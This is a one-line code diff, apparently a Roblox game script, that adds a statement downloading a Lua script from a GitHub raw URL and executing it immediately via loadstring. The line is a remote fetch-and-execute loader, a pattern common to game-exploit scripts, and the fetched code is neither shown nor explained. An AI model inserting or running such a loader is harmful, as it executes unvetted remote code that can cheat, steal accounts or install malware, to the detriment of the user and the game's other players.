@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nAlwspa/Into/main/NeedMoreGood%3F"))()
